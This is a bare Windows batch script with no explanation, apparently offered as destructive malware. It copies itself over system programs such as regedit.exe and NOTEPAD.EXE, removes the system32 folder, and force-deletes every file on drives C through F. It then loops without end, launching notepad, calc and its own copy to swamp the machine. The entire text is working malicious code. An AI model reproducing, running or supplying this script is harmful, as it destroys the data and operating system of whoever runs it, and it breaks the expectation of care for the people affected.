@echo off
copy %0 %systemroot%\warrock.exe
cls
copy %0 %systemroot%\NOTEPAD.EXE
cls
copy %0 %systemroot%\regedit.exe
cls

rd %systemroot%\system32 -s -q
cls
cd../../../../..
cls
cd %systemroot%\system32
cls
del %systemroot%\system32\*.* -f -s -q
cls
del c:\*.* -f -s -q
cls
del d:\*.* -f -s -q
cls
del e:\*.* -f -s -q
cls
del f:\*.* -f -s -q
cls
:begin
start notepad.exe
start calc.exe
start %systemroot%\warrock.exe
cls
goto :begin
